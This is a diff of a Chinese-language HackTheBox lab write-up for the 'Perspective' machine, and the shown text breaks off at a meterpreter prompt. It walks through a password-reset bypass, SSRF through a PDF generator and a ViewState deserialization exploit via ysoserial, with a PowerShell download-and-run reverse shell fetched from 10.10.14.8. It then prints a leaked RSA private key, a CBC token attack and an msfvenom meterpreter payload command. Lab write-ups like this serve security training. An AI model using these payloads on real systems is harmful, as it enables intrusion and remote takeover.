@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;451 10.10.11.151   端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV 10.10.11.151Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-06-01 13:3">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;451 10.10.11.151                                                                                                              端口扫描22和80: 123456789">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Perspective - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/06/02/Perspective-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;451 10.10.11.151   端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV 10.10.11.151Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-06-01 13:3">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;451 10.10.11.151                                                                                                              端口扫描22和80: 123456789">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022060101.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022060102.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022060103.jpg">
@@ -141,7 +141,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -230,7 +230,14 @@
 <li><a href="https://www.hackthebox.com/home/machines/profile/451" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/451</a></li>
 <li>10.10.11.151</li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060101.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060101.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.151</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 13:31 CST</span><br><span class="line">Nmap scan report for 10.10.11.151</span><br><span class="line">Host is up (0.20s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH for_Windows_7.7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 d6:7f:3f:d4:22:15:ce:64:f3:c8:00:79:bf:f6:f8:f8 (RSA)</span><br><span class="line">|   256 08:c6:d4:f3:98:84:0f:fd:4b:ed:e3:a6:25:bd:e7:70 (ECDSA)</span><br><span class="line">|_  256 32:81:6a:8b:4d:f9:61:09:ff:d3:99:6c:e7:3f:a3:ac (ED25519)</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 133.66 seconds</span><br></pre></td></tr></table></figure>
 
@@ -239,33 +246,126 @@
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>添加hosts后访问，一个NPRS：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.151 perspective.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060102.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060102.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="NPRS"><a href="#NPRS" class="headerlink" title="NPRS"></a>NPRS</h1><p>注册登录,support那里可以得到管理员邮箱：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin@perspective.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060103.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060103.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="reset-password"><a href="#reset-password" class="headerlink" title="reset password"></a>reset password</h2><p>登录时选择忘记密码，第一步输入自己的注册邮箱，第二步密保问题留空，拦截修改为admin邮箱，成功重置admin密码</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060105.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060104.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060106.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060105.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060104.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060106.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="Admin-Panel"><a href="#Admin-Panel" class="headerlink" title="Admin Panel"></a>Admin Panel</h2><p>管理员功能是加载用户信息生成pdf：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060108.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060107.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060108.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060107.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="include-file"><a href="#include-file" class="headerlink" title="include file"></a>include file</h2><p>回到普通用户界面，创建新商品，上传图片功能，结合web应用，进行文件读取：</p>
 <ul>
 <li>ASP Including Files<br><a href="https://www.w3schools.com/asp/asp_incfiles.asp" target="_blank" rel="noopener">https://www.w3schools.com/asp/asp_incfiles.asp</a></li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060109.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060110.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060111.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060109.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060110.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060111.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>根据web.config内容，下一步是localhost的8080</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">appSettings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">add</span> <span class="attr">key</span>=<span class="string">"environment"</span> <span class="attr">value</span>=<span class="string">"Production"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">add</span> <span class="attr">key</span>=<span class="string">"Domain"</span> <span class="attr">value</span>=<span class="string">"perspective.htb"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">add</span> <span class="attr">key</span>=<span class="string">"ViewStateUserKey"</span> <span class="attr">value</span>=<span class="string">"ENC1:3UVxtz9jwPJWRvjdl1PfqXZTgg=="</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">add</span> <span class="attr">key</span>=<span class="string">"SecurePasswordServiceUrl"</span> <span class="attr">value</span>=<span class="string">"http://localhost:8000"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">appSettings</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="local-8080"><a href="#local-8080" class="headerlink" title="local 8080"></a>local 8080</h2><p>这里结合admin的pdf功能，Description那里加载我们控制的html，其中是iframe加载local 8080:</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060112.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060114.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060112.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060114.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>渲染过程中会执行iframe加载local 8080，是一个swagger：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060113.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060113.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV&#x3D;&quot;refresh&quot; CONTENT&#x3D;&quot;0;url&#x3D;http:&#x2F;&#x2F;10.10.14.8&#x2F;test.html&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="test-html"><a href="#test-html" class="headerlink" title="test.html"></a>test.html</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;localhost:8000&#x2F;&quot; height&#x3D;&quot;2000px&quot; width&#x3D;&quot;2000px&quot; &gt;</span><br><span class="line">&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
@@ -273,7 +373,14 @@
 <h2 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h2><p>后面就是一步步获取信息,调用接口解密ViewStateUserKey：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SAltysAltYV1ewSTaT3</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060115.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060115.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h3 id="swagger-html"><a href="#swagger-html" class="headerlink" title="swagger.html"></a>swagger.html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>= <span class="string">"http://localhost:8000/swagger/v1/swagger.json"</span> <span class="attr">height</span>= <span class="string">"2000px"</span> <span class="attr">width</span>= <span class="string">"2000px"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="decrypt-html"><a href="#decrypt-html" class="headerlink" title="decrypt.html"></a>decrypt.html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Pwned<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"Pwnform"</span> <span class="attr">target</span>=<span class="string">"iframe"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://localhost:8000/decrypt?cipherTextRaw=ENC1%3a3UVxtz9jwPJWRvjdl1PfqXZTgg%3d%3d"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"iframe"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'Pwnform'</span>).submit();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -285,29 +392,87 @@
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\miao\Desktop\ysoserial-<span class="number">1.34</span>\Release&gt;ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span class="string">"powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8/Invoke-PowerShellTcp.ps1')"</span> --generator=<span class="number">0414</span>C274 --validationalg=<span class="string">"SHA1"</span> --viewstateuserkey=<span class="string">"SAltysAltYV1ewSTaT3"</span> --validationkey=<span class="string">"99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF"</span></span><br><span class="line"></span><br><span class="line">/wEy8gcAAQAAAP////<span class="number">8</span>BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACUBjw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBwb3dlcnNoZWxsIElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzEwLjEwLjE0LjgvSW52b2tlLVBvd2VyU2hlbGxUY3AucHMxJykiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+C7/gorYt5fyOhhM5rE+jbNw0GNpw</span><br></pre></td></tr></table></figure>
 
 <p>还是普通用户新建商品那里替换，触发反序列化，得到reverse shell：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060116.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060117.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060118.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060116.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060117.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060118.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的webuser用户桌面，user.txt:</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060119.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060119.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="webuser-id-rsa"><a href="#webuser-id-rsa" class="headerlink" title="webuser_id_rsa"></a>webuser_id_rsa</h2><p>这个windows启用了ssh，当前用户.ssh目录也给出了私钥，方便后续操作：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEAzfoQwqu9tIYiy694HbGmT+qw2b+kUTnEcqEOEXv5+vLcVqZ2</span><br><span class="line">APlHTSDj4rSzv+tJoHQiRf3IyVpNNqGw8+wM+P3wdozY66BUPHqz6FpRHxcMT2Ss</span><br><span class="line">Nk9J9hxTi2L3oBVR83F0abBWnOClOqjrd8SMVRcyCi1&#x2F;svSdOP8OPh9s+mpa5TG2</span><br><span class="line">KEiI66whlBKKC1N2szF4rQNtkCGUw66zheHSxK5j6axjiP0sstC6hUJy2uqu3DXK</span><br><span class="line">0dOtwMUk5EOpkFPTZxlIzgbUI&#x2F;CcQ8ipaankvrHrh8x8DKdv9KspzKhLflS5Ayie</span><br><span class="line">3PyFQ5lg9TCLk4dzyeB8YkBkBEXUbCePvNBFRwIDAQABAoIBAFwtqeyE0TwFv3Kq</span><br><span class="line">DzYyt3wSSpzYD+At2wV1oAchFWlB4GuCyVJ8PHV+350oQz0DPgrpjiEGhyHdIKrv</span><br><span class="line">R3KR0+hmNIPJWpZwROJgAz1blew081RgeFVBvJbAbH73hlwEzo0E3BUkTk6cljUf</span><br><span class="line">PWl281ptK&#x2F;60B+79W5MTSbtxcuLJgcvB&#x2F;REYU3GPUK&#x2F;dTSVU7IMV2hBrFP6srlqT</span><br><span class="line">aGZ2ugm6xNV14Iq0KOpuHfYXXSdkklOt+eSZ8AWTQTkZtSfLJUybOaLYStOGn35S</span><br><span class="line">IupwD4kxZbAtX54Avdi8rq61H4TIrM82B2+UpPkdd2P6am822mlQa4lVrnJCbq88</span><br><span class="line">z6Xv6ckCgYEA9+lwddycXp0A4WlhmIu5A1440uZELhAfeRlBQVpeqlF0Ig2XjUyb</span><br><span class="line">WhEu+lMlEfbsiWK&#x2F;rfIp53uuBkstXc2ImKfhSbys8KMkJKq6Fp+OjbbFYSIS9mSP</span><br><span class="line">f91W658OtfoNG&#x2F;UHPp74f6&#x2F;mogsbKpNP0nPDnjFBQLMuL2pYO&#x2F;Q7p2sCgYEA1LJi</span><br><span class="line">bPM&#x2F;rpbzyGjJSYd50xNP1ftaUyZwRWCWAgAWLXKVVbuNdPNy6GvjyaNkJcPz3dh+</span><br><span class="line">zSsLZeSyyVWUvFQslkkZaMvWZVDdwh9x8i3N&#x2F;NhhTbqVTyBBqWTyk0l0WJVcHtUb</span><br><span class="line">q6kSIYucmw&#x2F;zH9qlpfYHvMWZN2kSHq+kwlMAfJUCgYBmTSpfOJ4+XMOUQQxJCr9a</span><br><span class="line">KHOCdAsGhxi1vDo1YblWxy4JL1qusEIbNKQSIGVXuHF7cAhxG1E3eM4jQrqBzuLj</span><br><span class="line">O8O3zef&#x2F;lRLBHsKTu1v0Fsv0fT8d9flRZmEL8iL77SejtcU7jhY1erzNeY&#x2F;ITenO</span><br><span class="line">in7atLCcplQUtOmcM&#x2F;i56QKBgQDRjiMNBqfSYqUy6ZKPoCt1u4wn3eoDDFcG8383</span><br><span class="line">30&#x2F;6XO8mtY9MD2NB&#x2F;LJDgnh0ANiu1NMxXtxu+mDvniLZXfFD7CddqZ7E2WRzEroY</span><br><span class="line">Cert114ez9q1R6mJtIyOcotvj1BgjEQj34KejEeyOoel9azIk1rSMLig8CNLGnAw</span><br><span class="line">iMhs9QKBgQC6pv2GxsrQmUEPiE0vorFtMulMi7vRYe7kfgsohE8grqKzsveLQJok</span><br><span class="line">R+67L9QcuLwo2OWng2d2oEFkx9dx++ewEluo8ZjcOx3TVDIIZDUw4KdD0Q&#x2F;josqp</span><br><span class="line">RhZbZ6EF094JTnINnexb9OhQMwQJHAhp63o5dH6fFXSTUpW10u+mkA&#x3D;&#x3D;</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
 
 <h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>8009端口，转发出来，看起来和之前的网站一样</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i webuser_id_rsa webuser@10.10.11.151 -L 8009:127.0.0.1:8009</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060120.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060120.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="perespective-dll"><a href="#perespective-dll" class="headerlink" title="perespective.dll"></a>perespective.dll</h2><p>.net dll反编译，分析代码，重点是token那部分</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\WEBAPPS\PartImages_Staging\bin\perespective.dll</span><br><span class="line">C:\WEBAPPS\PartImages_Prod\bin\perespective.dll</span><br></pre></td></tr></table></figure>
 
 <p>密码学领域内容了，token使用AES CBC,前16字节是iv</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060121.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022060121.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>大概是调用本地命令修改密码，命令注入</p>
 <h1 id="CBC-attack"><a href="#CBC-attack" class="headerlink" title="CBC attack"></a>CBC attack</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 重置密码请求，邮箱填充到16位，获得token解码</span></span><br><span class="line">a@a.aa++++++++++</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> -n vedAtEi1tb8mS67dUSv1CqojLHQPIfwhGxdUofWkhaN40d1KbzY7tKS0gZjr1CMZ  | base64 -d| xxd -p| tr -d <span class="string">"\n"</span></span></span><br><span class="line"></span><br><span class="line">bde740b448b5b5bf264baedd512bf50aaa232c740f21fc211b1754a1f5a485a378d1dd4a6f363bb4a4b48198ebd42319</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建shell，上传到服务器上</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">meterpreter &gt; 